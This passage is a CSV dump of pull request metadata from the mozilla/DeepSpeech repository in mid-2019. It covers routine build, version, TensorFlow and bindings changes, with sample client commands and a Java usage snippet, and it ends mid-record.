2021,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2242,2242,Package Windows link-lib,,lissyx,1645737,2019-07-12T10:07:06Z,COLLABORATOR,True,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e6c05a23139bf764d4177b6314c7b1bb4827b092,Package Windows link-lib
2022,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2241,2241,Include additional op libs to silence warnings,,reuben,477142,2019-07-11T23:25:59Z,MEMBER,True,7,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fe88960c69cc00b40d65e838a8b2b4991896f1dc,Include additional op libs to silence warnings
2023,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2240,2240,Add CuDNN RNN support,,reuben,477142,2019-07-11T23:21:50Z,MEMBER,True,66,39,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f7a715d506dac932a712f7e443ddbe1f3abf328d,Use CuDNN RNN for training
2024,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2240,2240,Add CuDNN RNN support,,reuben,477142,2019-07-11T23:21:50Z,MEMBER,True,66,39,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fd3fbcaa780cb9dd568a78d603b569cee2ef496e,Address review comments
2025,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2239,2239,Use TaskCluster caching for Python and Homebrew setup on macOS,,lissyx,1645737,2019-07-11T12:55:49Z,COLLABORATOR,True,126,44,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,cfb8f816115f9ebd638db11ffdc56606121d6149,Leverage TaskCluster-level caching for Homebrew and Python on macOS
2026,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2238,2238,Bump VERSION to 0.6.0-alpha.3,,lissyx,1645737,2019-07-11T11:48:47Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0c63cf80b31e7ab3f57fc664542b0eb25e95efe3,Bump VERSION to 0.6.0-alpha.3
2027,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2234,2234,Ensure proper removal of prefix,Fixes #2230,lissyx,1645737,2019-07-10T08:16:18Z,COLLABORATOR,True,3,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c3a2b6ea48e69b7bfc2839f34d3542edbf6fb9bc,"Ensure proper removal of prefix

Fixes #2230"
2028,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2232,2232,Bump VERSION to 0.6.0-alpha.2,,lissyx,1645737,2019-07-05T15:44:10Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,922e0c54fb4e2ecfa8166d6e1861c3ee054d70d6,Bump VERSION to 0.6.0-alpha.2
2029,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2228,2228,Ensure 'npm install' under task directory,,lissyx,1645737,2019-07-03T08:33:02Z,COLLABORATOR,True,11,5,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,46bf75074fb168d8ba840be825fa1c5a45cc7182,Ensure 'npm install' under task directory
2030,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2226,2226,Fix trivial shadow variable in util script,Signed-off-by: Li Li <eggonlea@msn.com>,eggonlea,610469,2019-07-02T17:40:07Z,COLLABORATOR,True,1,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0190c48d5eb224f49a9e3c79a914dea16f474a5d,"Fix trivial shadow variable in util script

Signed-off-by: Li Li <eggonlea@msn.com>"
2031,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2225,2225,WIP: Debug NodeJS v9 macOS failures,,lissyx,1645737,2019-07-02T16:31:34Z,COLLABORATOR,True,15,14,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,39b388c1ea68eb847504df2e422444aa165afb29,"Fix NodeJS bindings leakage / GC crash with MetadataItem querying

Fixes #2217"
2032,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2223,2223,WIP: No need for items field,,lissyx,1645737,2019-07-01T13:00:02Z,COLLABORATOR,False,0,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,37ff078d294b47c7e94539adb44832d7c664af09,WIP: No need for items field
2033,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2222,2222,"Update versions of Python, NodeJS and ElectronJS",,lissyx,1645737,2019-07-01T12:11:49Z,COLLABORATOR,True,66,24,16,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8753b19eb350d3421946d06b9a568b1171d573c5,"Update versions of Python, NodeJS and ElectronJS"
2034,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2218,2218,Update to TF 1.14,,reuben,477142,2019-06-28T13:37:14Z,MEMBER,True,122,121,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d52ab9df0b5cc76aeca866def524d228a95ce4f0,Add TF op libs to libdeepspeech dependencies and rename darwin -> macos
2035,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2218,2218,Update to TF 1.14,,reuben,477142,2019-06-28T13:37:14Z,MEMBER,True,122,121,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dc78f8d1e65c4b387aa335df243898cd04704f98,Remove deprecated SessionConfig in favor of just using defaults
2036,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2218,2218,Update to TF 1.14,,reuben,477142,2019-06-28T13:37:14Z,MEMBER,True,122,121,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6f3e824ef7bf5ba25590fedd67b87f5f99850d3a,Use tf.compat.v1 to silence deprecation warnings and enable TF 2.0 testing
2037,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2218,2218,Update to TF 1.14,,reuben,477142,2019-06-28T13:37:14Z,MEMBER,True,122,121,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,93e9ac19c57da0ef26580dee390fb82da67a5941,Bump references to TF 1.13.1 to TF 1.14.0
2038,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2218,2218,Update to TF 1.14,,reuben,477142,2019-06-28T13:37:14Z,MEMBER,True,122,121,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,615b31a094fd0a0ad5d5c337445e597d664cffae,Switch to deepspeech-win-b worker type with cudafe++ fix
2039,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2218,2218,Update to TF 1.14,,reuben,477142,2019-06-28T13:37:14Z,MEMBER,True,122,121,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0b96ba40c2183fad6c974ef300ddc8f2e158e2c1,Workaround 7z missing path problem by removing redundant destination argument
2040,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2218,2218,Update to TF 1.14,,reuben,477142,2019-06-28T13:37:14Z,MEMBER,True,122,121,36,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4ca74f72d1b57b7a51fd0bfc248354bcad2f174a,Switch to mozilla/tensorflow r1.14 indexes
2041,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2216,2216,Document TF_FORCE_GPU_ALLOW_GROWTH,Fixes #2211,lissyx,1645737,2019-06-27T14:51:51Z,COLLABORATOR,True,8,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1acfadfc982ec606f980485e1d01518d2d9101f6,"Document TF_FORCE_GPU_ALLOW_GROWTH

Fixes #2211"
2042,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2215,2215,Package DeepSpeech header,Fixes #2214,lissyx,1645737,2019-06-27T13:08:06Z,COLLABORATOR,True,2,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2f225dc987dccdabfc17fc867bde430b783d32e1,"Package DeepSpeech header

Fixes #2214"
2043,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2212,2212,Use bazel workspace status to generate versions,,reuben,477142,2019-06-25T17:11:39Z,MEMBER,True,73,105,12,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d50c0397c7f11a01ccff1f6825008e14dd8940a5,Use bazel workspace status to generate versions
2044,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2210,2210,Handle git submodules for getting DeepSpeech / TensorFlow versions,Fixes #2209,lissyx,1645737,2019-06-25T10:54:21Z,COLLABORATOR,True,17,5,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fd156a63f626457203188600d569c26ae1dc0243,"Handle git submodules for getting DeepSpeech / TensorFlow versions

Fixes #2209"
2045,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2207,2207,Bump VERSION to 0.6.0-alpha.1,Fixes #2206,lissyx,1645737,2019-06-25T09:09:48Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,08bb1cbdefb7e64207d2743a1df1433e5535a48e,"Bump VERSION to 0.6.0-alpha.1

Fixes #2206"
2046,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2205,2205,Remove default value from batch size flags (Fixes #2204),,reuben,477142,2019-06-24T21:50:42Z,MEMBER,False,6,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7fbcb4f9fd06bb174cc8da2b5ed3b71da57b84d1,Remove default value from batch size flags
2047,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2203,2203,Drop NodeJS 9 support,,reuben,477142,2019-06-24T16:09:38Z,MEMBER,False,1,82,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b1846ae3499d79681269c08504637fb456f2b811,Drop NodeJS 9 support
2048,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2200,2200,Allow for different sample rate exports,Sets output format to Sox transformer,rhamnett,6739670,2019-06-23T18:47:40Z,CONTRIBUTOR,True,5,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c248ed0435cfe04138a7032032197a1549f9f596,"Allow for different sample rate exports

Sets output format to Sox transformer"
2049,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2199,2199,Abstract sample rate / update beam width,"Abstract SAMPLE_RATE variable for use with other formats such as 8000hz

I understand default beam width to now be 1024",rhamnett,6739670,2019-06-23T18:30:16Z,CONTRIBUTOR,True,9,6,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a5c62691de6ec3f7c0ad34ca7a2141aedde5e3aa,"Abstract sample rate / update beam width

Abstract SAMPLE_RATE variable for use with other formats such as 8000hz

I understand default beam width to now be 1024"
2050,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2199,2199,Abstract sample rate / update beam width,"Abstract SAMPLE_RATE variable for use with other formats such as 8000hz

I understand default beam width to now be 1024",rhamnett,6739670,2019-06-23T18:30:16Z,CONTRIBUTOR,True,9,6,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,4b155e380292f5571e7c24379d538216e8743b93,"missed an error message

update error msg"
2051,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2199,2199,Abstract sample rate / update beam width,"Abstract SAMPLE_RATE variable for use with other formats such as 8000hz

I understand default beam width to now be 1024",rhamnett,6739670,2019-06-23T18:30:16Z,CONTRIBUTOR,True,9,6,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8929335d29e4eda152c3790e78cd3fedc0954ccc,typo
2052,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2199,2199,Abstract sample rate / update beam width,"Abstract SAMPLE_RATE variable for use with other formats such as 8000hz

I understand default beam width to now be 1024",rhamnett,6739670,2019-06-23T18:30:16Z,CONTRIBUTOR,True,9,6,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6687c30fcee2303c066b8fae13a5a45ddce60069,Update client.py
2053,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2199,2199,Abstract sample rate / update beam width,"Abstract SAMPLE_RATE variable for use with other formats such as 8000hz

I understand default beam width to now be 1024",rhamnett,6739670,2019-06-23T18:30:16Z,CONTRIBUTOR,True,9,6,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bcd619da4081a2f89a92e83e938573b2100f48f3,Update client.py
2054,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2198,2198,Update to Homebrew 2.1.6,,reuben,477142,2019-06-22T17:40:16Z,MEMBER,True,19,19,19,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d7241df2417689f521f53846ba2d2fc6249553e2,Update to Homebrew 2.1.6
2055,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2197,2197,Update to Homebrew 2.1.6,"Trying a fix for our recent macOS failures. The way Homebrew works isn't particularly suitable to pinning a version, as brew will clone its dependencies from master regardless of what version it's running. Trying the latest release to see if things explode.",reuben,477142,2019-06-22T12:53:14Z,MEMBER,False,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b1d66aa2281c9e5fa6334493c4d30d5ba900826c,Update to Homebrew 2.1.6
2056,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2195,2195,TFLite runtime on Linux/macOS/Windows,,lissyx,1645737,2019-06-21T23:20:27Z,COLLABORATOR,True,158,9,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a9ec2b5cd641dfd6198fbf773358b1cbc2101607,Building TFLite runtime on Linux/macOS/Windows
2057,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2195,2195,TFLite runtime on Linux/macOS/Windows,,lissyx,1645737,2019-06-21T23:20:27Z,COLLABORATOR,True,158,9,17,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ad11e02582ac86f975f5e3a3ef5f4cfdab3fa0e4,Testing TFLite runtime on Linux/macOS/Windows
2058,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2194,2194,Switch to ConstFst from VectorFst and mmap trie file when reading,,reuben,477142,2019-06-21T22:09:36Z,MEMBER,True,31,23,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,31afc6811f1cacc7eba1943e27931de3d7b8a8dc,Switch to ConstFst from VectorFst and mmap trie file when reading
2059,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2194,2194,Switch to ConstFst from VectorFst and mmap trie file when reading,,reuben,477142,2019-06-21T22:09:36Z,MEMBER,True,31,23,9,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,585d94df7f9dc25ac3b442e42afe917146e6d6ac,Update trie files to renenerated versions
2060,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2193,2193,Show error message if unable to load alphabet file,Addresses #2186.,dabinat,18251622,2019-06-21T01:22:49Z,COLLABORATOR,False,6,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5854e1c9a640328fedbfd99f7debd2697096bd6c,Show error message if unable to load alphabet file
2061,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2192,2192,add validators for command line arguments that require paths,This adds a check to make sure files exist using abseil for some of the command line flags. See issue in  #1954.,ftyers,449545,2019-06-20T23:39:58Z,COLLABORATOR,True,24,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c6fb55975a27c13591228c2211d703668348e4ca,add validators for command line arguments that require paths
2062,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2192,2192,add validators for command line arguments that require paths,This adds a check to make sure files exist using abseil for some of the command line flags. See issue in  #1954.,ftyers,449545,2019-06-20T23:39:58Z,COLLABORATOR,True,24,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b839b52c13cbe516f3de4ff53245ee7650d2d5e2,remove redundant lambdas for mandatory arguments
2063,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2192,2192,add validators for command line arguments that require paths,This adds a check to make sure files exist using abseil for some of the command line flags. See issue in  #1954.,ftyers,449545,2019-06-20T23:39:58Z,COLLABORATOR,True,24,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,5b209d9d5b25c44fd13b6857076929e0cb44c34b,Squash two commits
2064,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2191,2191,update .compute for 0.5.1 release,,ftyers,449545,2019-06-20T22:11:53Z,COLLABORATOR,True,4,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e569b31b466a2256c4081a360ffb2804e9402b06,update .compute for 0.5.1 release
2065,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2190,2190,Update prod tests to point to re-exported 0.5 model,This is just the checkpoint from 0.5.0 re-exported with the code from 0.6.0-alpha.0 since we changed the inference graph in #2184,reuben,477142,2019-06-20T21:36:10Z,MEMBER,True,22,20,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f70f0684843e8e65ba34a5480c3f635ac4c5413c,Update prod tests to point to re-exported 0.5 model
2066,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2190,2190,Update prod tests to point to re-exported 0.5 model,This is just the checkpoint from 0.5.0 re-exported with the code from 0.6.0-alpha.0 since we changed the inference graph in #2184,reuben,477142,2019-06-20T21:36:10Z,MEMBER,True,22,20,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,79ab22086e0cfa7c7a749f395bfe21d0b140b701,Fix tests to preserve multiline output and stderr output
2067,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2190,2190,Update prod tests to point to re-exported 0.5 model,This is just the checkpoint from 0.5.0 re-exported with the code from 0.6.0-alpha.0 since we changed the inference graph in #2184,reuben,477142,2019-06-20T21:36:10Z,MEMBER,True,22,20,7,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ceb9de9fad62b027d5cea9577ff3db56be7c066c,Fix concurrent_streams.py on Python 2.7
2068,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2189,2189,Bump version to 0.6.0-alpha.0,X-DeepSpeech: NOBUILD,reuben,477142,2019-06-20T20:37:28Z,MEMBER,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dc1c71690782c333559b903c724d81ef740128ff,"Bump version to 0.6.0-alpha.0

X-DeepSpeech: NOBUILD"
2069,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2184,2184,Fix for DS_IntermediateDecode modifying live prefixes in DecoderState,,reuben,477142,2019-06-18T15:11:00Z,MEMBER,True,63,28,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d5d55958dab77122ed0e935d056259076b0af45e,Clean up formatting in ctc_beam_saerch_decoder.cpp
2070,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2184,2184,Fix for DS_IntermediateDecode modifying live prefixes in DecoderState,,reuben,477142,2019-06-18T15:11:00Z,MEMBER,True,63,28,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,95a54bfdb8b2f9d0d2b85cc7b8438c4b11be7e57,Modify copies rather than live prefix scores in decoder_decode
2071,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2184,2184,Fix for DS_IntermediateDecode modifying live prefixes in DecoderState,,reuben,477142,2019-06-18T15:11:00Z,MEMBER,True,63,28,5,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,37b82f93ace77975bfe0f24030d3523b852ccc73,Add a test for calling DS_IntermediateDecode during streaming
2072,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2181,2181,Streaming,"**Run native client in legacy mode**
`./deepspeech --model models/output_graph.pbmm --alphabet models/alphabet.txt --lm models/lm.binary --trie models/trie --audio ../data/ldc93s1/LDC93S1.wav`

**Output:**
she had educatin greasy wat for a year

**Run native client in streaming mode**
`./deepspeech --model models/output_graph.pbmm --alphabet models/alphabet.txt --lm models/lm.binary --trie models/trie --audio ../data/ldc93s1/LDC93S1.wav --stream 1280`

**Output:**

she had
she had red
she had
she had us
she had uuu and gr
she had uuu and 
she had uuu and greasy 
she had uuu and greasy wat
she had uuu and greasy water
she had uuu and greasy wato a
she had uuu and greasy wato a year",eggonlea,610469,2019-06-18T02:56:20Z,COLLABORATOR,True,39,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2604da4bc20b9c7bfc02e9b527304ee4571f4fda,"native_client: option to run streaming mode

Signed-off-by: Li Li <eggonlea@msn.com>"
2073,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2176,2176,Move all tc-* scripts under taskcluster/,Fixes #1912,lissyx,1645737,2019-06-14T13:33:38Z,COLLABORATOR,True,128,127,144,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,bec5be764042a3d5fa10af196d5145814b9b0004,"Move all tc-* scripts under taskcluster/

Fixes #1912"
2074,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2174,2174,Apply strip_unused on inference graph,,lissyx,1645737,2019-06-14T11:38:54Z,COLLABORATOR,True,9,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8466d5e4ebc7792a458206bfbd9c6c2d3f69f933,Apply strip_unused on inference graph
2075,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2173,2173,Update ElectronJS headers dist-url,Fixes #2172,lissyx,1645737,2019-06-14T09:05:13Z,COLLABORATOR,True,5,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e87e5616ed01a6f92ec04642316e0343b91fd414,"Update ElectronJS headers dist-url

Fixes #2172"
2076,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2168,2168,dump output when evaulating,"Save the output for future use (e.g. calculate WER directly without running STT again).
And print the current progress.

Signed-off-by: Li Li <eggonlea@msn.com>",eggonlea,610469,2019-06-12T00:31:51Z,COLLABORATOR,True,29,11,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,863c5544ca1a652afeafc826d19ce55c03894b52,"evaluate_tflite: Fix shared Queue

Also dump output to a file
Fixed some trivial pylint issues at the same time

Signed-off-by: Li Li <eggonlea@msn.com>"
2077,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2167,2167,Bump version to 0.5.0,,reuben,477142,2019-06-11T15:14:40Z,MEMBER,True,3,3,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a7e1d819ad9cc1c3f37caa0838e98f73b55a5b0f,"Bump version to 0.5.0

X-DeepSpeech: NOBUILD"
2078,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2166,2166,Recode of the Java bindings,"A few weeks ago, I opened an Issue that DeepSpeech Java bindings (non Android only) should exist.
Here they are. The Java bindings were completely re-coded for reasons already discussed in the issue I opened.
The three Readme files contain instructions on how to use the java library and build the following binaries:
* `deepspeechandroid.aar`
*  `libdeepspeech-java.jar`
* `libdeepspeech-jni_cpu`
* `libdeepspeech-jni_cuda`
For convenience, I recommend putting them in future releases, so that they must not be built by the user, which might be a bit of a pain.
 `deepspeechandroid.aar` and `libdeepspeech-java.jar` could be available on the Maven repository. _(The old bindings are already, so they could be replaced)_

### A feeling of what it's like to use the bindings in Java
```java
DeepSpeechLibraryConfig config = new DeepSpeechLibraryConfig.Desktop.CPU(
        new File(""natives/"" + getOS() + ""/libdeepspeech_cpu."" + getOSLibExtension()).toURI().toURL(),
        new File(""natives/"" + getOSName() + ""/libdeepspeech-jni_cpu."" + getOSLibExtension()).toURI().toURL()
);
try {
     config.loadDeepSpeech();
} catch (IOException e) {
    Logger.logMsg(Logger.ERROR, ""Failed to load DeepSpeech!"");
}

DeepSpeechModel model = new DeepSpeechModel(new File(""model/output_graph.pb""), N_CEP, N_CONTEXT, new File(""model/alphabet.txt""), BEAM_WIDTH);
model.enableLMLanguageModel(new File(""model/alphabet.txt""), new File(""model/lm.binary""), new File(""model/trie""), LM_ALPHA, LM_BETA);

AudioInputStream audioIn = AudioSystem.getAudioInputStream(new File(""testInput.wav""));

long sampleRate = (long) audioIn.getFormat().getSampleRate();
long numSamples = audioIn.getFrameLength();
long frameSize = audioIn.getFormat().getFrameSize();        

ByteBuffer audioBuffer = ByteBuffer.allocateDirect((int) (numSamples * 2)); // 2 bytes for each sample --> 16 bit audio
String transcription = model.doSpeechToText(audioBuffer, numSamples, sampleRate);
System.out.println(""You said: \"""" + transcription + ""\""."");
```",mikex86,41896826,2019-06-11T12:18:24Z,NONE,False,4219,1220,123,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6f8797f89ba509c1ada91e11f6e3a4215ec01ed8,Recode of the Java Bindings
2079,https://api.github.com/repos/mozilla/DeepSpeech/pulls/2166,2166,Recode of the Java bindings,"A few weeks ago, I opened an Issue that DeepSpeech Java bindings (non Android only) should exist.
Here they are. The Java bindings were completely re-coded for reasons already discussed in the issue I opened.
The three Readme files contain instructions on how to use the java library and build the following binaries:
* `deepspeechandroid.aar`
*  `libdeepspeech-java.jar`
* `libdeepspeech-jni_cpu`
* `libdeepspeech-jni_cuda`
For convenience, I recommend putting them in future releases, so that they must not be built by the user, which might be a bit of a pain.
 `deepspeechandroid.aar` and `libdeepspeech-java.jar` could be available on the Maven repository. _(The old bindings are already, so they could be replaced)_

### A feeling of what it's like to use the bindings in Java
```java
DeepSpeechLibraryConfig config = new DeepSpeechLibraryConfig.Desktop.CPU(
        new File(""natives/"" + getOS() + ""/libdeepspeech_cpu."" + getOSLibExtension()).toURI().toURL(),
        new File(""natives/"" + getOSName() + ""/libdeepspeech-jni_cpu."" + getOSLibExtension()).toURI().toURL()
);
try {
     config.loadDeepSpeech();
} catch (IOException e) {
    Logger.logMsg(Logger.ERROR, ""Failed to load DeepSpeech!"");
}

DeepSpeechModel model = new DeepSpeechModel(new File(""model/output_graph.pb""), N_CEP, N_CONTEXT, new File(""model/alphabet.txt""), BEAM_WIDTH);
model.enableLMLanguageModel(new File(""model/alphabet.txt""), new File(""model/lm.binary""), new File(""model/trie""), LM_ALPHA, LM_BETA);

AudioInputStream audioIn = AudioSystem.getAudioInputStream(new File(""testInput.wav""));

